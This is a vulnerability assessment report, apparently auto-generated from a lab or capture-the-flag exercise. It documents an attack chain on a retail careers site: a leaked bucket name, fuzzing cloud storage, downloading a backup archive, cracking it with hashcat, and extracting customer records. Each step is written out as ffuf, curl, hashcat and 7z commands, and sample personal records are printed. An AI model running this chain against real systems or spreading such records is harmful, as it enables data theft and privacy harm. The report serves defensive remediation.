# Vulnerability Assessment Report — careers.gigantic-retail.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T16:18:39Z  
**Target:** careers.gigantic-retail.com  
**Campaign:** camp_20260802_3ced7196  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**careers.gigantic-retail.com**) presents an **extremely poor security posture**. Our team confirmed 3 critical and 1 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Publicly Accessible Backup Archive in GCS Bucket (backup.7z)**  
The Google Cloud Storage bucket 'it-storage-bucket' contains a publicly accessible backup archive at https://storage.googleapis.com/it-storage-bucket/backup.7z (22,072 bytes). While bucket listing is ...

**2. Customer PII Exposure - 500 Records with Names, Addresses, Phone Numbers**  
The extracted backup archive (backup.7z) contains a file 'customers-credit-review.csv' with 500 customer records containing personally identifiable information (PII): first_name, last_name, full addre...

**3. Internal Flag Captured - Proof of Full Data Exfiltration**  
An internal flag file (flag.txt) was extracted from the publicly-accessible backup archive, containing the value: ea0aebbb6d68571f668e18c8fc03589d. This proves complete data exfiltration from the expo...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> External red-team assessment of Gigantic Retail's cloud storage exposure revealed a critical attack chain: a GCS bucket name (it-storage-bucket) leaked via commented-out HTML on the careers site enabled anonymous object fuzzing that discovered a publicly accessible backup archive (backup.7z) containing 500 customer PII records and an internal flag. The archive password ('balance') was cracked in seconds using a CeWL-derived wordlist from the careers site itself. Total: 3 Critical, 1 High, 1 Medium findings.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 3 | 3 | 0 |
| HIGH | 1 | 1 | 0 |
| MEDIUM | 1 | 0 | 1 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **5** | **4** | **1** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_8e51a6` | Publicly Accessible Backup Archive in GCS Bucket (... | CRITICAL | 9.1 | **EXPLOITED** | `storage.googleapis.com/it-storage-bucket/backup.7z` |
| 2 | `vuln_49bc41` | Customer PII Exposure - 500 Records with Names, Ad... | CRITICAL | 9.1 | **EXPLOITED** | `storage.googleapis.com/it-storage-bucket/backup.7z...` |
| 3 | `vuln_b5db2e` | Internal Flag Captured - Proof of Full Data Exfilt... | CRITICAL | 9.1 | **EXPLOITED** | `storage.googleapis.com/it-storage-bucket/backup.7z...` |
| 4 | `vuln_cedcbe` | Weak Archive Password Derived from Public Website ... | HIGH | 7.5 | **EXPLOITED** | `storage.googleapis.com/it-storage-bucket/backup.7z` |
| 5 | `vuln_4596b6` | GCS Bucket Reference Leaked in HTML Comments | MEDIUM | 5.3 | Confirmed | `careers.gigantic-retail.com/index.html` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Publicly Accessible Backup Archive in GCS Bucket (backup.7z)

| Field | Value |
|-------|-------|
| **ID** | `vuln_8e51a6` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 Information Deletion / A.5.33 Protection of Records` |
| **Endpoint** | `https://storage.googleapis.com/it-storage-bucket/backup.7z` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:17:45Z |

#### Description

The Google Cloud Storage bucket 'it-storage-bucket' contains a publicly accessible backup archive at https://storage.googleapis.com/it-storage-bucket/backup.7z (22,072 bytes). While bucket listing is denied (403), individual object access is allowed for guessable filenames. The file was discovered via ffuf fuzzing with a backup/IT-focused wordlist. The archive is password-protected with 7zAES encryption, but the password ('balance') was cracked using hashcat (mode 11600) with a CeWL-derived wordlist from the careers site.

#### Technical Analysis

A password-protected 7z backup archive was discovered publicly accessible in the GCS bucket via object name fuzzing. The password was 'balance', a word scraped from the careers site itself, demonstrating weak password selection tied to public-facing content. The archive contained sensitive customer PII and an internal flag.

#### Exploitation Commands

```bash
ffuf -u "https://storage.googleapis.com/it-storage-bucket/FUZZ" -w /tmp/gcs-fuzz.txt -mc 200,301,302,403 -fc 404 -t 10 -v
curl -sS -o /tmp/backup.7z "https://storage.googleapis.com/it-storage-bucket/backup.7z"
7z l /tmp/backup.7z
7z2john /tmp/backup.7z > /tmp/7z-hash.txt
hashcat -m 11600 /tmp/7z-hash.txt /tmp/cewl-wordlist.txt --force -O
7z x /tmp/backup.7z -o/tmp/backup-out -pbalance -y
```

#### Evidence / Logs

```
ffuf result: [Status: 200, Size: 22072] https://storage.googleapis.com/it-storage-bucket/backup.7z
7z listing: backup.7z contains customers-credit-review.csv (54160 bytes) and flag.txt (33 bytes), Method: LZMA2:16 7zAES
hashcat: Status=Cracked, Password=balance (from CeWL wordlist of careers site)
7z extract: Everything is Ok, Files: 2, Size: 54193
```

#### Remediation

1. Immediately remove public access to backup.7z from the GCS bucket. 2. Enforce uniform bucket-level access with IAM-only permissions. 3. Never store backup archives in publicly-accessible cloud storage. 4. Use strong, randomly-generated passwords for encrypted archives. 5. Implement GCS bucket audit logging and alerts for public access. 6. Review all objects in it-storage-bucket for additional exposure.

---

### 3.2 — Customer PII Exposure - 500 Records with Names, Addresses, Phone Numbers

| Field | Value |
|-------|-------|
| **ID** | `vuln_49bc41` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.5.34 Privacy and Protection of PII` |
| **Endpoint** | `https://storage.googleapis.com/it-storage-bucket/backup.7z -> customer...` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:18:01Z |

#### Description

The extracted backup archive (backup.7z) contains a file 'customers-credit-review.csv' with 500 customer records containing personally identifiable information (PII): first_name, last_name, full address (street, city, county, state, zip), two phone numbers, and email references. This data was publicly accessible via the unsecured GCS bucket object. Sample records include: James Butt (6649 N Blue Gum St, New Orleans, LA 70116, 504-621-8927), Josephine Darakjy (4 B Blue Ridge Blvd, Brighton, MI 48116, 810-292-9388), Art Venere (8 W Cerritos Ave #54, Bridgeport, NJ 08014, 856-636-8749). This constitutes a data breach under GDPR/CCPA regulations.

#### Technical Analysis

500 customer records with full PII (names, addresses, phone numbers, emails) were extracted from the publicly-accessible backup archive. The filename 'customers-credit-review.csv' suggests this data was used for credit review purposes, making it particularly sensitive. This exposure constitutes a reportable data breach under GDPR Article 33 and CCPA.

#### Exploitation Commands

```bash
7z x /tmp/backup.7z -o/tmp/backup-out -pbalance -y
head -20 /tmp/backup-out/customers-credit-review.csv
wc -l /tmp/backup-out/customers-credit-review.csv
```

#### Evidence / Logs

```
CSV header: first_name,last_name,address,city,county,state,zip,phone1,phone2,email
Total records: 500 (501 lines including header)
Sample: James,Butt,6649 N Blue Gum St,New Orleans,Orleans,LA,70116,504-621-8927,504-845-1427,EMAIL_001
Sample: Josephine,Darakjy,4 B Blue Ridge Blvd,Brighton,Livingston,MI,48116,810-292-9388,810-374-9840,EMAIL_002
Sample: Art,Venere,8 W Cerritos Ave #54,Bridgeport,Gloucester,NJ,8014,856-636-8749,856-264-4130,EMAIL_003
```

#### Remediation

1. Initiate data breach notification procedures under applicable regulations (GDPR 72-hour notification, CCPA). 2. Remove the backup archive immediately. 3. Assess whether affected customers need to be notified. 4. Implement DLP controls to prevent PII from being stored in cloud storage buckets. 5. Encrypt sensitive data at rest with customer-managed keys. 6. Conduct a full audit of all cloud storage for PII exposure.

---

### 3.3 — Internal Flag Captured - Proof of Full Data Exfiltration

| Field | Value |
|-------|-------|
| **ID** | `vuln_b5db2e` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 Information Deletion` |
| **Endpoint** | `https://storage.googleapis.com/it-storage-bucket/backup.7z -> flag.txt` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:18:09Z |

#### Description

An internal flag file (flag.txt) was extracted from the publicly-accessible backup archive, containing the value: ea0aebbb6d68571f668e18c8fc03589d. This proves complete data exfiltration from the exposed GCS bucket object, demonstrating that an anonymous attacker can discover, download, crack, and extract all contents from the backup archive without any authentication.

#### Technical Analysis

The flag file confirms complete exploitation chain: HTML source leak -> bucket name discovery -> object name fuzzing with ffuf -> backup.7z download -> password cracking with CeWL wordlist -> full data extraction including PII and flag.

#### Exploitation Commands

```bash
cat /tmp/backup-out/flag.txt
```

#### Evidence / Logs

```
flag.txt content: ea0aebbb6d68571f668e18c8fc03589d
```

#### Remediation

Address all upstream vulnerabilities: remove HTML comments exposing bucket names, restrict GCS bucket object access, use strong encryption passwords, and implement comprehensive cloud storage security controls.

---

### 3.4 — Weak Archive Password Derived from Public Website Content

| Field | Value |
|-------|-------|
| **ID** | `vuln_cedcbe` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `weak_credentials` |
| **MITRE ATT&CK** | `T1110` — Brute Force |
| **ISO 27001** | `A.5.17 Authentication Information` |
| **Endpoint** | `https://storage.googleapis.com/it-storage-bucket/backup.7z` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:18:21Z |

#### Description

The password protecting the backup.7z archive ('balance') is a common English word found directly on the careers website. This was cracked in under 5 seconds using hashcat with a CeWL-style wordlist of 143 words extracted from the public careers page. The password selection demonstrates a critical failure in password policy - using words from the organization's own public content.

#### Technical Analysis

The archive password 'balance' appears in the careers page text ('Work-Life Balance'). An attacker can trivially build a targeted wordlist from the organization's own public web content and crack the archive password in seconds.

#### Exploitation Commands

```bash
curl -sS https://careers.gigantic-retail.com/index.html | sed 's/<[^>]*>//g' | sed 's/[^A-Za-z]/ /g' | sed 's/ /\n/g' | awk 'length >= 4' | sort -u > /tmp/cewl-wordlist.txt
hashcat -m 11600 /tmp/7z-hash.txt /tmp/cewl-wordlist.txt --force -O
```

#### Evidence / Logs

```
hashcat output: Status=Cracked, Hash.Mode=11600 (7-Zip), Speed=#1=328 H/s
Cracked password: balance
Source: CeWL wordlist from https://careers.gigantic-retail.com/index.html (143 words)
Time to crack: < 5 seconds
```

#### Remediation

1. Mandate minimum 16-character randomly-generated passwords for archive encryption. 2. Never use words from organizational content as passwords. 3. Consider using asymmetric encryption (GPG) instead of password-based archive encryption for sensitive data. 4. Implement a password policy that requires complexity and prohibits dictionary words.

---

### 3.5 — GCS Bucket Reference Leaked in HTML Comments

| Field | Value |
|-------|-------|
| **ID** | `vuln_4596b6` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.9 Configuration Management` |
| **Endpoint** | `https://careers.gigantic-retail.com/index.html` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:17:26Z |

#### Description

The careers site HTML source at https://careers.gigantic-retail.com/index.html contains a commented-out HTML block referencing a Google Cloud Storage bucket: https://storage.googleapis.com/it-storage-bucket/images/retail1.jpg. This exposes the internal bucket name 'it-storage-bucket' to any visitor who views the page source, enabling targeted enumeration attacks.

#### Technical Analysis

The HTML source contains commented-out code referencing a GCS bucket URL, leaking the internal bucket name 'it-storage-bucket' to anyone who views page source.

#### Exploitation Commands

```bash
curl -sS https://careers.gigantic-retail.com/index.html | grep -i storage.googleapis.com
```

#### Evidence / Logs

```
Found in HTML comment: <!-- <img src=\"https://storage.googleapis.com/it-storage-bucket/images/retail1.jpg\" alt=\"Career Image\"> -->
```

#### Remediation

Remove all commented-out code referencing internal cloud storage URLs from production HTML. Use environment-specific references and ensure no cloud resource identifiers are exposed in client-facing code.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Publicly Accessible Backup Archive in GCS Bucket (backup.7z) | High |
| Customer PII Exposure - 500 Records with Names, Addresses, P... | High |
| Internal Flag Captured - Proof of Full Data Exfiltration | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Weak Archive Password Derived from Public Website Content | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| GCS Bucket Reference Leaked in HTML Comments | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T16:18:39Z*  
*Campaign: camp_20260802_3ced7196 | Target: careers.gigantic-retail.com*
